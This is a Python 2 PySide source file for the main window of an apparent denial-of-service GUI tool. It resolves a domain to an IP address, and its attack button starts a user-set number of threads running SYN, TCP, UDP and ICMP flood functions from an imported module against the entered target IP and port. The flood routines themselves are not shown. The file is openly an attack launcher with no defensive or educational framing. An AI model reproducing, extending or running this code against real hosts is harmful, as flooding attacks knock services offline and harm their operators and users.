# -*- coding: utf-8 -*-

"""
Module implementing MainWindow.
"""

from PySide.QtCore import Slot
from PySide.QtGui import QMainWindow, QDesktopWidget
from Ui_MainWindow import Ui_MainWindow
import Func, threading


class MainWindow(QMainWindow, Ui_MainWindow):
    """
    Class of main window.
    """
    def __init__(self, parent=None):
        """
        Constructor of main window.
        """
        QMainWindow.__init__(self, parent)
        self.setupUi(self)
        self.center()
        
    def center(self, parent=None):
        screen = QDesktopWidget().screenGeometry()
        size = self.geometry()
        self.move((screen.width()-size.width())/2, (screen.height()-size.height())/2)
    
    @Slot()
    def on_getIPBtn_clicked(self):
        domainName = self.domainInput.text()
        ipaddress = Func.getIP(domainName)
        self.ipInput.setText(ipaddress)
    
    @Slot()
    def on_atkBtn_clicked(self):
        count = int(self.countInput.text())
        ip = self.ipInput.text()
        port = int(self.portInput.text())
        
        # syn flood
        if self.synChk.isChecked():
            for i in xrange(count):
                threading.Thread(target=Func.synFlood, args=(ip, port)).start()
        # tcp flood
        if self.tcpChk.isChecked():
            for i in xrange(count):
                threading.Thread(target=Func.tcpFlood, args=(ip, port)).start()
        
        # udp flood
        if self.udpChk.isChecked():
            for i in xrange(count):
                threading.Thread(target=Func.udpFlood, args=(ip, port)).start()
        
        # icmp flood
        if self.icmpChk.isChecked():
            for i in xrange(count):
                threading.Thread(target=Func.icmpFlood, args=(ip, )).start()
